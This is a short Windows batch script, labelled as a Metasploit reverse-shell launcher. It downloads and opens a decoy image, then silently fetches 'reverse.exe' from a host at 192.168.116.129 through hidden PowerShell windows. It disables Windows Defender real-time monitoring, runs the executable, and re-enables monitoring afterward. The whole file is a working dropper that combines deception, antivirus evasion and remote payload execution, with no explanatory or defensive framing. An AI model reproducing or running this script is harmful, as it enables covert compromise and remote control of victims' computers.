REM reverse shell using metasploit
@echo off
cd %TEMP%

set "IMAGE_URL=https://raw.githubusercontent.com/3rr0r-505/jongoDB/main/jongo.png" REM Replace with the image hosting site
set "EXE_URL=http://192.168.116.129/reverse.exe" REM Replace with the file hosting site
set "EXE_FILE=%TEMP%\reverse.exe"  REM Replace with the desired absolute path

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%IMAGE_URL%', 'image.jpg')"

start /B "" image.jpg

ping 127.0.0.1 -n 6 > nul

powershell -WindowStyle Hidden -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('%EXE_URL%', '%EXE_FILE%');"

powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

start /B /WAIT "" "%EXE_FILE%"

powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
